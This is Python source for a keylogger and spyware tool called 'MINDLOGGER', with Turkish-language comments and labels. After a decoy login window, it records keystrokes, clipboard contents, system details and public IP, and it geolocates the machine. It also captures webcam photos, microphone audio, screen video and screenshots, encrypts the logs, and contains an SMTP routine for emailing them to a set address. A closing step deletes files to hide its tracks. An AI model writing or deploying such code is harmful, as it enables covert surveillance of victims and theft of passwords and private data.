from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import cv2

from geopy.geocoders import Nominatim
import geocoder

from cv2 import VideoCapture,imshow,imwrite,waitKey,destroyWindow
import write

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd
import wavio as wv


from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


import argparse
import queue
import sys

from matplotlib.animation import FuncAnimation
import matplotlib.pyplot as plt
import numpy as np
import sounddevice as sd

import pyautogui

import tkinter as tk 

print("MINDLOGGER ARAYÜZÜ")
arayuz = tk.Tk()
arayuz.title("Kullanıcı Girişi")
arayuz.geometry("450x400")


a1 = "kullanıcı adı"
a2 = "şifre"


kullanici = tk.Label(text="KULLANICI ADINIZ : ")
kullanici.place(x=50,y=150)

y = tk.StringVar()

kullanici_girisi = tk.Entry(textvariable=y)
kullanici_girisi.place(x=170,y=150)

kullanici = tk.Label(text="ŞİFRENİZİ GİRİNİZ : ")
kullanici.place(x=56,y=178)

x = tk.StringVar()

kullanici_girisi = tk.Entry(textvariable=x)
kullanici_girisi.place(x=170,y=178)

dogru_yanlis = tk.Label(font="Algerian 15 bold")
dogru_yanlis.place(x=100,y=280)

dogru_yanlis = tk.Label(font="Algerian 15 bold")
dogru_yanlis.place(x=50,y=280)

def giris_komut():
    kullanici = y.get()
    sifre = x.get()
    print (kullanici,"\n",sifre)
    if kullanici == a1 and sifre == a2 :
        print("DOĞRU")
        dogru_yanlis.config(text="Girişiniz Gerçekleşti" ,fg="green")
        arayuz.destroy()
    else : 
        print("YANLIŞ")
        dogru_yanlis.config(text="Yanlış Kullanıcı Adı Veya Şifre"  , fg="red")
giris = tk.Button(text="Giriş",command=giris_komut)
giris.place(x=300,y=220)



arayuz.mainloop()

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.mp3"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
web_information = "recording1"

#microphone_time = 5
time_iteration = 15
number_of_iterations_end = 3


email_address = "e-mail" 
password = "şifre"

username = getpass.getuser()

toaddr = "gönderilecek e-mail"

key = "generate.key'de oluşan key" 

file_path = "dosya yolu" 
extend = "\\"
file_merge = file_path + extend
"""
# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)
"""

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

#KONUM

#initialize the Nominatim object
Nomi_locator = Nominatim(user_agent="My App")

my_location= geocoder.ip('me')

#my latitude and longitude coordinates

latitude= my_location.geojson['features'][0]['properties']['lat']
longitude = my_location.geojson['features'][0]['properties']['lng']

#get the location
location = Nomi_locator.reverse(f"{latitude}, {longitude}")

print("Your Current IP location is", str(location))
dosya = open("dosya yolu","a")
dosya.write(str(location))
dosya.close()


cam_port = 0
cam = VideoCapture(cam_port)


#webcam_information= "webcam.jpg"
# reading the input using the camera
result, image = cam.read()

# If image will detected without any error, 
# show result
if result:

    # showing result, it take frame name and image 
    # output
    imshow("mindlogger", image)

    # saving image in local storage
    imwrite("foto.jpg", image)

    # If keyboard interrupt occurs, destroy image 
    # window
    waitKey(0)


# If captured image is corrupted, moving to else part
else:
    print("No image detected. Please! try again")


# get the microphone

# Sampling frequency
freq = 44100

# Recording duration
duration = 10 #saniye

# Start recorder with the given values
# of duration and sample frequency
recording = sd.rec(int(duration * freq),
                samplerate=freq, channels=2)

# Record audio for the given number of seconds
sd.wait()

# This will convert the NumPy array to an audio
# file with the given sampling frequency
write("dosya yolu", freq, recording)

# Convert the NumPy array to audio file
wv.write("dosya yolu2", recording, freq, sampwidth=2)


def int_or_str(text):
    """Helper function for argument parsing."""
    try:
        return int(text)
    except ValueError:
        return text


#EKRAN VİDEOSU
# display screen resolution, get it using pyautogui itself
SCREEN_SIZE = tuple(pyautogui.size())
# define the codec
fourcc = cv2.VideoWriter_fourcc(*"XVID")
# frames per second
fps = 12.0
# create the video write object
out = cv2.VideoWriter("output.avi", fourcc, fps, (SCREEN_SIZE))
# the time you want to record in seconds
record_seconds = 10

for i in range(int(record_seconds * fps)):
    # make a screenshot
    img = pyautogui.screenshot()
    # convert these pixels to a proper numpy array to work with OpenCV
    frame = np.array(img)
    # convert colors from BGR to RGB
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    # write the frame
    out.write(frame)
    # show the frame
    #cv2.imshow("screenshot", frame)
    # if the user clicks q, it exits
    if cv2.waitKey(1) == 5:
        break

# make sure everything is closed when exited
cv2.destroyAllWindows()
out.release()

# get screenshots

global imageNumber
imageNumber = 0

def screenshot():

    global imageNumber
    im = ImageGrab.grab()
    im.save(file_path + extend + str(imageNumber) + screenshot_information)
    imageNumber += 1

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration



# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        #screenshot()
        #send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    #send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)